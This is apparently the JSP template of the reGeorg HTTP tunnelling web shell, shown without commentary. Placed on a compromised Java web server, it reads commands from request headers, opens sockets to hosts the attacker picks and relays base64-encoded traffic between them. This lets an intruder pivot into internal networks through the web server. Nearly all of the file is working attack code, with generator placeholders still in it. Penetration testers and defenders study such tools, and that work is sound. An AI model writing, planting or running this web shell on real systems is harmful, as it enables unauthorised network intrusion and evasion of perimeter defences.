<%@page import="java.nio.ByteBuffer, java.net.InetSocketAddress, java.nio.channels.SocketChannel, java.util.Arrays, java.io.*, java.net.UnknownHostException, java.net.Socket"%>
<%
    response.setStatus(HTTPCODE);
    String cmd = request.getHeader("X-CMD");
    if (cmd != null) {
        String mark = cmd.substring(0,22);
        cmd = cmd.substring(22);
        response.setHeader("X-STATUS", "OK");
        if (cmd.compareTo("CONNECT") == 0) {
            try {
                String[] target_ary = new String(b64de(request.getHeader("X-TARGET"))).split("\\|");
                String target = target_ary[0];
                int port = Integer.parseInt(target_ary[1]);
                SocketChannel socketChannel = SocketChannel.open();
                socketChannel.connect(new InetSocketAddress(target, port));
                socketChannel.configureBlocking(false);
                session.setAttribute(mark, socketChannel);
                response.setHeader("X-STATUS", "OK");
            } catch (Exception e) {
                response.setHeader("X-ERROR", "Failed connecting to target");
                response.setHeader("X-STATUS", "FAIL");
            }
            puts(response, "");
        } else if (cmd.compareTo("DISCONNECT") == 0) {
            SocketChannel socketChannel = (SocketChannel)session.getAttribute(mark);
            try{
                socketChannel.socket().close();
            } catch (Exception e) {
            }
            session.removeAttribute(mark);
            puts(response, "");
        } else if (cmd.compareTo("READ") == 0){
            SocketChannel socketChannel = (SocketChannel)session.getAttribute(mark);
            try{
                ByteBuffer buf = ByteBuffer.allocate(513);
                int bytesRead = socketChannel.read(buf);
                ServletOutputStream so = response.getOutputStream();
                while (bytesRead > 0){
                    byte[] data = new byte[bytesRead];
                    System.arraycopy(buf.array(), 0, data, 0, bytesRead);
                    byte[] base64 = b64en(data).getBytes();
                    so.write(base64, 0, base64.length);
                    buf.clear();
                    bytesRead = socketChannel.read(buf);
                }
                so.close();
                response.setHeader("X-STATUS", "OK");

            } catch (Exception e) {
                response.setHeader("X-STATUS", "FAIL");
            }

        } else if (cmd.compareTo("FORWARD") == 0){
            SocketChannel socketChannel = (SocketChannel)session.getAttribute(mark);
            try {

                int readlen = request.getContentLength();
                byte[] buff = new byte[readlen];

                request.getInputStream().read(buff, 0, readlen);
                byte[] base64 = b64de(new String(buff));
                ByteBuffer buf = ByteBuffer.allocate(base64.length);
                buf.clear();
                buf.put(base64);
                buf.flip();

                while(buf.hasRemaining())
                    socketChannel.write(buf);

                response.setHeader("X-STATUS", "OK");

            } catch (Exception e) {
                response.setHeader("X-ERROR", "POST request read filed");
                response.setHeader("X-STATUS", "FAIL");
                socketChannel.socket().close();
            }
            puts(response, "");
        }
    } else {
        puts(response, "Georg says, 'All seems fine'");
    }
%>
<%!
    private static char[] en = "BASE64 CHARSLIST".toCharArray();
    public static String b64en(byte[] data) {
        StringBuffer sb = new StringBuffer();
        int len = data.length;
        int i = 0;
        int b1, b2, b3;
        while (i < len) {
            b1 = data[i++] & 0xff;
            if (i == len) {
                sb.append(en[b1 >>> 2]);
                sb.append(en[(b1 & 0x3) << 4]);
                sb.append("==");
                break;
            }
            b2 = data[i++] & 0xff;
            if (i == len) {
                sb.append(en[b1 >>> 2]);
                sb.append(en[((b1 & 0x03) << 4)
                        | ((b2 & 0xf0) >>> 4)]);
                sb.append(en[(b2 & 0x0f) << 2]);
                sb.append("=");
                break;
            }
            b3 = data[i++] & 0xff;
            sb.append(en[b1 >>> 2]);
            sb.append(en[((b1 & 0x03) << 4)
                    | ((b2 & 0xf0) >>> 4)]);
            sb.append(en[((b2 & 0x0f) << 2)
                    | ((b3 & 0xc0) >>> 6)]);
            sb.append(en[b3 & 0x3f]);
        }
        return sb.toString();
    }
    private static byte[] de = new byte[] {BASE64 ARRAYLIST};
    public static byte[] b64de(String str) {
        byte[] data = str.getBytes();
        int len = data.length;
        ByteArrayOutputStream buf = new ByteArrayOutputStream(len);
        int i = 0;
        int b1, b2, b3, b4;
        while (i < len) {
            do {
                b1 = de[data[i++]];
            } while (i < len && b1 == -1);
            if (b1 == -1) {
                break;
            }
            do {
                b2 = de[data[i++]];
            } while (i < len && b2 == -1);
            if (b2 == -1) {
                break;
            }
            buf.write((int) ((b1 << 2) | ((b2 & 0x30) >>> 4)));
            do {
                b3 = data[i++];
                if (b3 == 61) {
                    return buf.toByteArray();
                }
                b3 = de[b3];
            } while (i < len && b3 == -1);
            if (b3 == -1) {
                break;
            }
            buf.write((int) (((b2 & 0x0f) << 4) | ((b3 & 0x3c) >>> 2)));
            do {
                b4 = data[i++];
                if (b4 == 61) {
                    return buf.toByteArray();
                }
                b4 = de[b4];
            } while (i < len && b4 == -1);
            if (b4 == -1) {
                break;
            }
            buf.write((int) (((b3 & 0x03) << 6) | b4));
        }
        return buf.toByteArray();
    }

    void puts(HttpServletResponse r, String str) throws Exception {
        byte[] bs = str.getBytes();
        ServletOutputStream so = r.getOutputStream();
        so.write(bs, 0, bs.length);
        so.close();
    }
%>
